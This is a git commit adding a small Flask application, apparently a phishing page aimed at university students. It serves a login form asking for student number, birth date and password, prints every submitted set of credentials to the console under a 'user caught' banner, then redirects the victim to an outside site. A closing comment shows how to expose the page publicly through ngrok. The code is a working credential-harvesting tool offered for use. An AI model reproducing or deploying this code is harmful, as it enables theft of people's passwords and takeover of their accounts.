a96ebe3be41da6ceff5f4a7d5e587f7db1c00ad7
iamjhonaldrix <jhonaldrixobernil@iskolarngbayan.pup.edu.ph>
2026-06-10 20:55:37 +0800

    init

---
+++ app.py
@@ -0,0 +1,61 @@
+from flask import Flask, render_template, request, redirect
+import time
+
+app = Flask(__name__)
+from flask_ngrok import run_with_ngrok
+@app.route('/', methods=['GET', 'POST'])
+def home():
+    show_alert = False #until the user input his/her password hehe hacker
+
+    if request.method == 'POST':
+        studno = request.form.get('studno')
+        month = request.form.get('SelectMonth')
+        day = request.form.get('SelectDay')
+        year = request.form.get('SelectYear')
+        password = request.form.get('password')
+
+        print(f"""
+\033[1;31m╔════════════════════════════════════════════════╗
+║ ██████╗ ██████╗ ██████╗ ██╗     ██╗███╗   ██╗ ║
+║ ██╔══██╗╚════██╗██╔══██╗██║     ██║████╗  ██║ ║
+║ ██████╔╝ █████╔╝██████╔╝██║     ██║██╔██╗ ██║ ║
+║ ██╔══██╗ ╚═══██╗██╔══██╗██║     ██║██║╚██╗██║ ║
+║ ██████╔╝██████╔╝██║  ██║███████╗██║██║ ╚████║ ║
+║ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═══╝ ║
+╠════════════════════════════════════════════════╣
+║              🚨  user caught  🚨              ║
+╠════════════════════════════════════════════════╣
+\033[1;32m║ 🆔 STUDENT ID   : {studno}
+║ 🎂 BIRTH DATE   : {month}-{day}-{year}
+║ 🔑 PASSWORD     : {password}
+\033[1;31m╠════════════════════════════════════════════════╣
+║        STATUS : ACCESS DENIED ❌               ║
+║        RESULT : CONTROL ESTABLISHED ☠          ║
+╚════════════════════════════════════════════════╝
+\033[0m
+""")
+
+        if studno != "HelloWorld" and password != "HelloWorld":
+            show_alert = True
+            time.sleep(0.1)
+            return redirect("https://sulasok.cz/")
+    
+    return render_template('form.html')
+
+if __name__ == '__main__':
+    app.run()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#  ~\Downloads\ngrok-v3-stable-windows-amd64\ngrok.exe http 5000
